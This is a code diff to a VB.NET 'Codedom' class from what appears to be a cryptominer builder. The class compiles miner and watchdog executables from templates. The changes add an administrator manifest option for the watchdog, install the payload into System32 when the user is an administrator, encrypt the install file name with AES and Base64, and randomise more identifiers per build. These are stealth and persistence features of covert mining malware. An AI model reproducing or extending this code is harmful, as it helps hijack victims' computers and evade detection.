@@ -10,7 +10,6 @@ Public Class Codedom
     Public Shared UninstallerOK As Boolean = False
     Public Shared F As Form1
 
-    Public Shared GlobalRProgram As String
     Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String)
         MinerOK = False
 
@@ -20,10 +19,8 @@ Public Class Codedom
         Dim Parameters As New CompilerParameters
         Dim OP As String = " /target:winexe /platform:x64 /optimize "
 
-        GlobalRProgram = F.Randomi(F.rand.Next(5, 40))
-
         With Parameters
-            .GenerateExecutable = False
+            .GenerateExecutable = True
             .OutputAssembly = Path
             .CompilerOptions = OP
             .IncludeDebugInformation = False
@@ -31,7 +28,6 @@ Public Class Codedom
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
             .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")
@@ -72,7 +68,7 @@ Public Class Codedom
 
     End Sub
 
-    Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String)
+    Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String, Optional RequireAdministrator As Boolean = False)
         WatchdogOK = False
 
         Dim providerOptions = New Dictionary(Of String, String)
@@ -81,10 +77,14 @@ Public Class Codedom
         Dim Parameters As New CompilerParameters
         Dim OP As String = " /target:winexe /platform:x64 /optimize "
 
-        GlobalRProgram = F.Randomi(F.rand.Next(5, 40))
+        If RequireAdministrator Then
+            File.WriteAllBytes(Path & ".manifest", My.Resources.administrator)
+            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
+            OP += " /win32manifest:""" + Path & ".manifest" + """"
+        End If
 
         With Parameters
-            .GenerateExecutable = False
+            .GenerateExecutable = True
             .OutputAssembly = Path
             .CompilerOptions = OP
             .IncludeDebugInformation = False
@@ -92,12 +92,9 @@ Public Class Codedom
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
             .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
 
             Dim watchdogbuilder As New StringBuilder(Code)
-
-            watchdogbuilder.Replace("#InjectionTarget", F.InjectionTarget(0))
 
             ReplaceGlobals(watchdogbuilder)
 
@@ -109,6 +106,10 @@ Public Class Codedom
                 WatchdogOK = False
             Else
                 WatchdogOK = True
+            End If
+
+            If RequireAdministrator Then
+                File.Delete(Path & ".manifest")
             End If
         End With
 
@@ -260,9 +261,9 @@ Public Class Codedom
                     installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
             End Select
 
-            If True Then 'F.FA.toggleInstallSystem32.Checked Then
+            If F.FA.toggleInstallSystem32.Checked Then
                 stringb.Replace("DefSystem32", "true")
-                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & ")," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
             Else
                 stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & "," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")
             End If
@@ -317,7 +318,7 @@ Public Class Codedom
         stringb.Replace("RStart", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RLoader", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RUninstaller", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RProgram", GlobalRProgram)
+        stringb.Replace("RProgram", F.Randomi(F.rand.Next(5, 40)))
 
         stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
@@ -334,6 +335,7 @@ Public Class Codedom
         stringb.Replace("rbD2", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rplp", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rxM", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rcheckcount", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("startDelay", F.txtStartDelay.Text)
     End Sub
 End Class
